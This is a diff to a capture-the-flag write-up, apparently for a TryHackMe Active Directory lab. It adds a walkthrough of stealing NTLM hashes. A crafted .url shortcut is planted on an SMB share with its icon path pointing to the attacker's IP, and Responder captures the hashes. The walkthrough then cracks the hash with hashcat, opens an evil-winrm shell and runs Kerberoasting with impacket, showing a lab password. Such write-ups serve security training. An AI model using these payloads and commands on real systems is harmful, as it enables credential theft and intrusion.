@@ -885,16 +885,91 @@ If we wait some time we can notice that the 3 files names are changed:
       dgx3zcsl.kce.pdf                    A  4700896  Mon Jul 17 10:11:53 2023
       yr1ezwhu.khh.pdf                    A  3032659  Mon Jul 17 10:12:09 2023
 
-I took a quick look to the files but they dont' reveal any useful information. Since there is an active traffic on this shares, we can try to upload some payload.
-Ref. https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes/
+I took a quick look to the files but they dont' reveal any useful information. Since there is an active traffic on this share, we can try to steal NTLM hashes for internal users. A very good resource about this type of attacks can be found [here](https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes). For this scenario I opted for the following payload:
 
-    sudo responder -I eth0 -v
+    cat report_share.url
+    [InternetShortcut]
+    URL=file://10.9.1.153/reports2024
+
+Then I uploaded the file to the Data share (<b>note that the server IP is changed from now on</b>):
+
+    smb: \onboarding\> put report_share.url 
+    putting file report_share.url as \onboarding\report_share.url (0.2 kb/s) (average 0.2 kb/s)
+    smb: \onboarding\> ls
+      .                                   D        0  Tue Jun 25 10:21:41 2024
+      ..                                  D        0  Tue Jun 25 10:21:41 2024
+      gv0j0izr.ehb.pdf                    A  4700896  Mon Jul 17 10:11:53 2023
+      info03yj.k4g.pdf                    A  3032659  Mon Jul 17 10:12:09 2023
+      report_share.url                    A       53  Tue Jun 25 10:21:39 2024
+      w14txhwv.3dx.txt                    A      521  Mon Aug 21 20:21:59 2023
+
+Then I started responder, waiting to get some hashes...
+
+    sudo responder -I tun0 -v
+
+But nothing came, so I guessed that this payload doesn't work, since a user has to open the .url file in order to trigger the exploit. Then I decided to try with the follow payload, using .ico approach:
+
+
+    cat google.url           
+    [InternetShortcut]
+    URL=https://www.google.com
+    IconIndex=0
+    IconFile=\\10.9.1.153\google.ico
+
+This payload is executed when a user just browses the folder containing the URL file (Data/onboarding). Note that this file is flagged as malicious by Defender on Win 11 Pro machine. Anyway uploading the file to the server share, after a while we can get the NTLM hashed for a user:
+
+    smb: \onboarding\> put google.url 
+    putting file google.url as \onboarding\google.url (0.4 kb/s) (average 0.3 kb/s)
+
+In responder console:
+
+    [SMB] NTLMv2-SSP Client   : 10.10.212.38
+    [SMB] NTLMv2-SSP Username : THM\AUTOMATE
+    [SMB] NTLMv2-SSP Hash     : AUTOMATE::THM:4f490ae6a6420c63...000000
+
+
+Then we can try to reverse the hashed password using hashcat:
+
+    hashcat -m 5600 -a 0 automate_hash /usr/share/wordlists/rockyou.txt 
+    hashcat (v6.2.6) starting
+    ...
+    AUTOMATE::THM:4f490ae6a6420c63:...00000000:Pxxxxxxxxx
+                                                          
+    Session..........: hashcat
+    Status...........: Cracked
+
+I tried to login through RDP but it failed, probably the user is a service account and cannot use terminal service. Since during the services discovery we found that the WinRMI port is open (5985), we can try to use this service to get a shell on the server:
+
+    evil-winrm -i 10.10.212.38 -u automate  
+    Enter Password: 
+                                            
+    Evil-WinRM shell v3.5
+    ...
+                                            
+    Info: Establishing connection to remote endpoint
+    *Evil-WinRM* PS C:\Users\automate\Documents> 
+
+Through the shell we can collect the user flag located in the desktop. Then I tried to search for common vulnerabilities to try to escalate my privilege but I found nothing, then I tried with kerberosting:
+
+    impacket-GetUserSPNs -outputfile kerberoastables.txt -dc-ip 10.10.212.38 'thm.corp/automate:Passw0rd1'
+    Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+    
+    ServicePrincipalName  Name               MemberOf                                                      PasswordLastSet             LastLogon                   Delegation  
+    --------------------  -----------------  ------------------------------------------------------------  --------------------------  --------------------------  -----------
+    CIFS/BDEWVIR1000000   MARCELINO_BALLARD  CN=AN-173-distlist1,OU=GOO,OU=People,DC=thm,DC=corp           2023-06-12 18:05:55.645235  <never>                                 
+    CIFS/HAYSTACK         3811465497SA       CN=Remote Management Users,CN=Builtin,DC=thm,DC=corp          2023-06-12 18:05:58.082696  <never>                                 
+    MSSQL/BDEWVIR1000000  MARION_CLAY        CN=Protected Users,CN=Users,DC=thm,DC=corp                    2023-06-12 18:05:58.379575  <never>                                 
+    ftp/HAYSTACK          MARION_CLAY        CN=Protected Users,CN=Users,DC=thm,DC=corp                    2023-06-12 18:05:58.379575  <never>                                 
+    https/HAYSTACK        FANNY_ALLISON      CN=CH-ecu-distlist1,OU=Groups,OU=OGC,OU=Stage,DC=thm,DC=corp  2023-06-12 18:05:55.067142  <never>                                 
+    kafka/HAYSTACK        FANNY_ALLISON      CN=CH-ecu-distlist1,OU=Groups,OU=OGC,OU=Stage,DC=thm,DC=corp  2023-06-12 18:05:55.067142  <never>                                 
+    kafka/BDEWVIR1000000  CYRUS_WHITEHEAD    CN=CH-ecu-distlist1,OU=Groups,OU=OGC,OU=Stage,DC=thm,DC=corp  2023-06-12 18:05:54.332753  <never>                                 
+    MSSQL/HAYSTACK        TRACY_CARVER       CN=CH-ecu-distlist1,OU=Groups,OU=OGC,OU=Stage,DC=thm,DC=corp  2023-06-12 18:05:53.879633  <never>                                 
+    POP3/BDEWVIR1000000   DEANNE_WASHINGTON  CN=CH-ecu-distlist1,OU=Groups,OU=OGC,OU=Stage,DC=thm,DC=corp  2023-06-12 18:05:54.488998  <never>                                 
+    POP3/HAYSTACK         DARLA_WINTERS      CN=Domain Computers,CN=Users,DC=thm,DC=corp                   2023-07-18 18:21:44.443061  2023-07-18 18:28:56.952295  constrained 
 
 
 
     
-
-
 
 
 
